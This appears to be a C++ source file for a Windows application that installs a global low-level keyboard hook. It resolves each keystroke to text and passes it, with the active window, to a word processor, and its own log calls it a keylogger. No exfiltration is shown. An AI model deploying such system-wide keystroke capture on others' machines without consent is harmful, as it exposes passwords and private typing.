#include "HookThread.h"


using namespace std;

HookThread::HookThread(/*Poco::Logger* _app, */IKeyResover* resolver, IWordProcessor* processor)/* : app(_app)*/ {
    logger = AppContainer::instance().appLogger();
    keyResolver = resolver;
    wordProcessor = processor;
    pBuf = NULL;
    hHook = NULL;
}

LRESULT CALLBACK HookThread::HookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    logger->debug("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!");

    KBDLLHOOKSTRUCT* pKeyboardData = (KBDLLHOOKSTRUCT*)lParam;
    //Получим результат нажатой клавиши в символьном ввиде
    std::wstring result = keyResolver->resolve(nCode, wParam, lParam);

    if (wordProcessor == NULL) throw std::runtime_error("WordProcessor is NULL");

    HWND window = GetForegroundWindow();

    wordProcessor->process(/*app, */window, result);

    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

void HookThread::stop() {
    //1) Need to remove hook
    //2) Need terminate current thread
    if(hHook != NULL)
        UnhookWindowsHookEx(hHook);
    PostQuitMessage(0);
}

void HookThread::run()
{

    AdapterWorker<HookThread, LRESULT CALLBACK, int, WPARAM, LPARAM> KeyHookProcAdapter(this, &HookThread::HookProc);
    hHook = SetWindowsHookExW(WH_KEYBOARD_LL, AdapterWorker<HookThread, LRESULT CALLBACK, int, WPARAM, LPARAM>::Function, NULL, 0);

    if (hHook == NULL) {
        logger->error(std::string("WorkerThread::HookJob() : ") + "Cannot install the hook procedure");
    }
    else {
        logger->information(std::string("WorkerThread::HookJob() : ") + "Hook procedure has been installed successfully");
        logger->information(std::string("WorkerThread::HookJob() : ") + "Keylogger is up and running...");

        //std::thread t([&]() {
        std::string pipePath = AppContainer::instance().config()->getString("application.pipe.path");
        std::wstring _pipePath = std::wstring(pipePath.begin(), pipePath.end());
        CommandProcessor cp(_pipePath, logger, [&]() {
            stop();
        });
        //    stop(); // Вызываем функцию myFunction и передаем ей переменные value и str
        //});

    }

    MSG msg = { };
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}


